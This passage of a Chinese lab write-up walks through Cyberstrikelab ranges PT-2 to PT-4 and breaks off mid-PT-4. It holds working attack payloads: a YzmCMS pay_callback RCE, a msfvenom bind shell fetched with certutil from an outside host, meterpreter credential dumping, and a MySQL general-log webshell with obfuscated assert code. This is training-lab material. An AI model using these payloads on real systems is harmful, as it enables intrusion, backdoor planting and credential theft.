---
title: 【Cyberstrikelab】 PT-2 ~ PT-8
url: https://mp.weixin.qq.com/s/BzhjrMACGLKB-PURByflrA
source: Doonsec's feed
date: 2026-01-24
fetch_date: 2026-01-25T03:51:57.796135
---

# 【Cyberstrikelab】 PT-2 ~ PT-8

![cover_image](https://mmbiz.qpic.cn/sz_mmbiz_jpg/nNzOrpxNkNMCgib8Y8sDRUVPok2icflib6IhnbxQfeUweY8XeFq3tvFnOEF6e6K2Bh9fKq4SUQ9TEhGPnxeYQjMcQ/0?wx_fmt=jpeg)

# 【Cyberstrikelab】 PT-2 ~ PT-8

原创

江思澄
江思澄

云晞科技Sec

![]()

在小说阅读器中沉浸阅读

**YunSee团队招新**

![](https://mmbiz.qpic.cn/sz_mmbiz_gif/nNzOrpxNkNMDupRfkbNbIW6mXS9bM9vOzCniciaURunvfYOGlfU3Utu7j8d7yVCcYcr62xpZCJ5a1ROzmZO3EswQ/640?wx_fmt=gif&from=appmsg)

无论你是刚踏入 CTF 世界的新秀，还是正在钻研某一方向的硬核选手，这里都是你的主场！魔丸交流群聚集了来自 Misc、Web、Crypto、RE、Pwn、区块链等方向的师傅，大家日常互相答疑、分享思路、组队冲榜，一起提升技术水平。

为了进一步壮大团队实力，我们现面向全网招募密码学、AI 安全、逆向方向的师傅 加入交流。只要你愿意分享、热爱探索、喜欢和同好一起“碰撞火花”，我们都热烈欢迎！

招新要求：

* 具有 CTF 比赛经验者优先，且在相关赛事中取得优异成绩者将予以重点考虑；
* 持有 CISP-PTE 证书者优先；
* 报名 MISC 或 Web 方向的同学需同时具备不少于两个 CTF 方向的基础或实战经验。

当然，我们也十分欢迎愿意一起交流、组队打 CTF 的师傅加入我们的“魔丸”交流群，在这里共同探讨技术、相互学习进步。

联系方式：

* 简历发邮箱：3690880260@qq.com（战队）
* 魔丸交流群：1034296865

# PT-2

确定YzmCMS v7.0

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nNzOrpxNkNMCgib8Y8sDRUVPok2icflib6I9GSicEpMwLP38qEjsnm9D2EY8EjtlEzdpiaicuus1fdZia5OOUtvnuQFag/640?wx_fmt=png&from=appmsg)

YzmCMS接口存在pay\_callback远程命令执行

```
https://github.com/v1cker/POC1/blob/main/YzmCMS/YzmCMS%E6%8E%A5%E5%8F%A3%E5%AD%98%E5%9C%A8pay_callback%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C.md
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nNzOrpxNkNMCgib8Y8sDRUVPok2icflib6Inp1bmdRwBHzhnN0O4ibcuTPvTNM9PcQocVmnM6F5iaGPLOOpTlOLMoDg/640?wx_fmt=png&from=appmsg)

```
http://192.168.1.11/pay/index/pay_callback
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nNzOrpxNkNMCgib8Y8sDRUVPok2icflib6ImtLkGg6JosHeRhgicJHFKZWIKWic7ezvGibyXJ3fBoicDF6DJXOHLMUwgw/640?wx_fmt=png&from=appmsg)

```
out_trade_no[0]=eq&out_trade_no[1]=whoami&out_trade_no[2]=system
```

确认是存在RCE漏洞，接下来上传msf正向木马

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nNzOrpxNkNMCgib8Y8sDRUVPok2icflib6IX4gN2WRb3FxpEnhlqO0UwEazPKw3A33RmrgibDNhMc1qwUDRhffxWqA/640?wx_fmt=png&from=appmsg)

```
 msfvenom -p windows/x64/meterpreter/bind_tcp LHOST=0.0.0.0 LPORT=4444 -f exe > shell.exe
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nNzOrpxNkNMCgib8Y8sDRUVPok2icflib6I3RsZUGIqO1Wun60qdzriaaOjMjFvbsyKOSvVcUF4TscNVI8zrXUM1dQ/640?wx_fmt=png&from=appmsg)

使用`ipconfig`命令查看一下未知适配器（Open VPN虚拟网卡）的本地连接地址，**注意：这里不是拷贝以太网连接的IP而是Open VPN虚拟网卡的IP**

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nNzOrpxNkNMCgib8Y8sDRUVPok2icflib6IdYFmTEcBibGqru8HhFZ2XF7k2LgoichIDBX10ibqYtYjbplicsfiasWuXaA/640?wx_fmt=png&from=appmsg)

```
out_trade_no[0]=eq&out_trade_no[1]=certutil -urlcache -split -f http://172.16.233.2:10101/shell.exe shell.exe&out_trade_no[2]=system
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nNzOrpxNkNMCgib8Y8sDRUVPok2icflib6I4fYj3PIFbaasabhnEhuKunnLwOncopSd5rvJBUKtH3M5ggtaHgiatQg/640?wx_fmt=png&from=appmsg)

验证是否上传成功

```
out_trade_no[0]=eq&out_trade_no[1]=dir&out_trade_no[2]=system
```

运行该程序

```
out_trade_no[0]=eq&out_trade_no[1]=shell.exe&out_trade_no[2]=system
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nNzOrpxNkNMCgib8Y8sDRUVPok2icflib6ItrF4MN5ZwF29jIVTHVxL3XfdbZ2V1Yy2jJy7icXgdCeMvof4OROPvRQ/640?wx_fmt=png&from=appmsg)

```
msfconsole
use exploit/multi/handler
set payload windows/x64/meterpreter/bind_tcp
set rhost 192.168.1.11
set lport 4444
run
```

进入`shell`读取flag

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nNzOrpxNkNMCgib8Y8sDRUVPok2icflib6IXLuPBicnyicNMXEyia4ggNe53tdIbY4icuNZwLxKl7CvAx2WmWpgqxpAgg/640?wx_fmt=png&from=appmsg)

载入`kiwi`模块，拿到所有用户凭证

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nNzOrpxNkNMCgib8Y8sDRUVPok2icflib6IQ3jmNrajOtgjricLnQM5RytY7m2c8mMtyaial89qflt5attHoNiagicwqA/640?wx_fmt=png&from=appmsg)

```
load kiwi
creds_all
```

# PT-3

提示弱口令

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nNzOrpxNkNMCgib8Y8sDRUVPok2icflib6IzJl5efSDj4s0JTBVwlF88na4xkRhvUGroBLLJUJk7GZ9Spgx0RiazCg/640?wx_fmt=png&from=appmsg)![](https://mmbiz.qpic.cn/sz_mmbiz_png/nNzOrpxNkNMCgib8Y8sDRUVPok2icflib6IIGpRiczvFWViaFMu3J0mgdoaCUdoEiagJicI3crlLCaq00aIJDKiaICv0OQ/640?wx_fmt=png&from=appmsg)

账户：cyberstrikelab 密码：123456

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nNzOrpxNkNMCgib8Y8sDRUVPok2icflib6IXhXbtuFKyQ2Nv6PLnn2dpaOcr5JpAuXSpbAiaPyLDwAgJFPq1CsOhpA/640?wx_fmt=png&from=appmsg)

寻找漏洞利用点

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nNzOrpxNkNMCgib8Y8sDRUVPok2icflib6Iibiaxrv7vWeWUoKfZ5JfJ4RRFtUDLicX4t1NLql1ZKh8b1Ade9bvxpXuw/640?wx_fmt=png&from=appmsg)![](https://mmbiz.qpic.cn/sz_mmbiz_png/nNzOrpxNkNMCgib8Y8sDRUVPok2icflib6IZKQUn9El56DialvFSia746VbWUmHVU4jR3ialTCdqZHcwYPxQ2UfickeKg/640?wx_fmt=png&from=appmsg)

参考：https://blog.csdn.net/m0\_69801663/article/details/135298635

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nNzOrpxNkNMCgib8Y8sDRUVPok2icflib6I7WoKcy12A2HDLicJVib1GNIqFwStaC846O3lZAxXbAtTyiboQbKwKRVAQ/640?wx_fmt=png&from=appmsg)

蚁剑连接

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nNzOrpxNkNMCgib8Y8sDRUVPok2icflib6If1wemnPy6dPsPolNLfAUNEM1rkZqC6fibdTbXKsibR0yb0RpibMCs3a5A/640?wx_fmt=png&from=appmsg)

读取flag文件乱码

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nNzOrpxNkNMCgib8Y8sDRUVPok2icflib6IrhOXQ1UAZSQ5WoaTT6FiamkF6cnJO1zPDeIdfqje7195CaibUia1P5oVQ/640?wx_fmt=png&from=appmsg)

尝试上传PT-2的msf正向连接后门，直接使用蚁剑上传shell失败

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nNzOrpxNkNMCgib8Y8sDRUVPok2icflib6IYwBL1ibmQlfvVFrIomibOCybXZHydGZwYmiap9mFwlv10RYlsZ2fW3weg/640?wx_fmt=png&from=appmsg)

使用命令上传

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nNzOrpxNkNMCgib8Y8sDRUVPok2icflib6IrAvgajQun52iak7ibe2UFfJmvHoyu0dHZSRwvB2azIiaBwml43BeqHnbA/640?wx_fmt=png&from=appmsg)

```
certutil -urlcache -split -f http://172.16.233.2:10101/shell.exe shell.exe
```

提权后进入shell终端查看flag.txt

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nNzOrpxNkNMCgib8Y8sDRUVPok2icflib6I7Q4Ah0k4Yfh96bpSckFHAZLeSDUMXwpYybjENthRsrCUN2CVcqxTFw/640?wx_fmt=png&from=appmsg)

# PT-4

拿到`flag.txt`

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nNzOrpxNkNMCgib8Y8sDRUVPok2icflib6IGMoYUdFKNzvTksA8zaTl3jExLuTsQ5QHR4XTrL0icZUw0903qVavaCg/640?wx_fmt=png&from=appmsg)

先目录扫描

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nNzOrpxNkNMCgib8Y8sDRUVPok2icflib6IB0f8PoFiaMzBLWxaRr3EBMQbNDqtCH2cCuibMArurTo0ZoDWbJdDibhjQ/640?wx_fmt=png&from=appmsg)

发现有个shell.php，这个文件名怀疑是后门？原来是phpstudy探针

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nNzOrpxNkNMCgib8Y8sDRUVPok2icflib6IdMhzj7DCE8hibvEaZe99NOj3tPPlOnRD6Ga7IbtBvBA00qkp7JjlfGQ/640?wx_fmt=png&from=appmsg)

发现有phpmyadmin数据库管理页

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nNzOrpxNkNMCgib8Y8sDRUVPok2icflib6IicxB8Rft5bF5Aw0L1yic2cDYTib1ZQ07uezp8HuWQ6nOasDRolSO0e5ibw/640?wx_fmt=png&from=appmsg)

还是老套路，账号：`root` 密码：`cyberstrikelab`

找到能执行SQL语句的点

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nNzOrpxNkNMCgib8Y8sDRUVPok2icflib6IgvDWjrLpJ9oZXxhlk4GWib9icCagq3ibOS6g1x6MvUC0pWibOWJR5l7ib3A/640?wx_fmt=png&from=appmsg)

利用SQL日志写马

查询操作文件权限，值为NULL表示没有限定目录，可以在任意地方写文件。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nNzOrpxNkNMCgib8Y8sDRUVPok2icflib6IMVJkVV7HVgTL5HM5fuicXWA0AGceU12ic6Nj5ciccyLrNo0GIFV6IuGwQ/640?wx_fmt=png&from=appmsg)

```
SHOW VARIABLES LIKE 'secure_file_priv';
```

查询日志功能是否开启以及日志文件路径，发现日志功能未开启。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nNzOrpxNkNMCgib8Y8sDRUVPok2icflib6IShTPID80LyEAPPXvenZlLspGyb5o4FsibVicUYnju6RKV4EKK6R40UOQ/640?wx_fmt=png&from=appmsg)

```
show variables like 'general_log%';
```

开启日志功能，并更改日志写入文件。shell.php探针得到该网站的操作系统是Windows 且用phpstudy搭建的，根目录为`C:/WWW/`

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nNzOrpxNkNMCgib8Y8sDRUVPok2icflib6IpI93qghU3YOfcACDjwwAQgcibgVIrZXNgKJRLLicpvK6LburPVVLDeEg/640?wx_fmt=png&from=appmsg)

```
set global general_log=on;
set global general_log_file='C:/WWW/123.php';
show variables like 'general_log%';
```

写入木马，木马需要做一个简单的免杀

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nNzOrpxNkNMCgib8Y8sDRUVPok2icflib6IXoz5DUdPVqzSHWOviaiaGaicOPrZicPmOia6SFJb4Pqv0OhXkJAoicDibPRKA/640?wx_fmt=png&from=appmsg)![](https://mmbiz.qpic.cn/sz_mmbiz_png/nNzOrpxNkNMCgib8Y8sDRUVPok2icflib6INpaib6bNMhwEHBbvia5dqlbyQ5E0oxCvW78ibWNvhGVqXq2rIRm7yuHrw/640?wx_fmt=png&from=appmsg)

```
select "<?php $a = 'assert';$b='_POST';$a($$b['shell']);?>"
```

哥斯拉连接拿到flag

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nNzOrpxNkNMCgib8Y8sDRUVPok2icflib6IAsc3ZyiaBJUCkNOMSGY8f0CHjicicMWDcvvhWaAMbOrzMu42YFYapiaUGw/640?wx_fmt=png&from=appmsg)

administrator用户桌面上：右键桌面->个性化，背景选择“幻灯片放映”

![](https://mmbiz.qp...